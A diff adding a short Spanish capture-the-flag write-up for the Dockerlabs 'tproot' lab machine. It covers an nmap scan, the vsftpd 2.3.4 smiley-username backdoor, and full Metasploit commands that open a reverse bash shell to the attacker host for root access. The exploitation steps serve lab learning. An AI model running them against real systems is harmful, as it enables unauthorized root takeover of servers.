@@ -1,0 +1,11 @@
+Como hacer la maquina de tproot en Dockerlabs, primero descargas la maquina docker vas a descargas con cd Descargas y haces unzip tproot
+Para ejecutarla hacer sudo bash auto_desploy tproot.tar y se ejecutaria
+Analizamiento: para analizar esta maquina he usado nmap -sC -sV 172.17.0.2 te sale los puertos abiertos y las versiones de las cosas que usa esta maquina tiene una version vulneralble en ftp 21
+que es la vs 2.3.4 que esque al meterte con ftp 172.17.0.2 y pones en usuario :) y una contraseña random se genera una consola con root en el puerto 6200, pero yo he usado metasploit
+asique lo que he hecho es msfconsole para abrirlo
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS 172.17.0.2
+set PAYLOAD cmd/unix/reverse_bash
+set LHOST 172.17.0.1
+run 
+y ya estaria tendriamos root
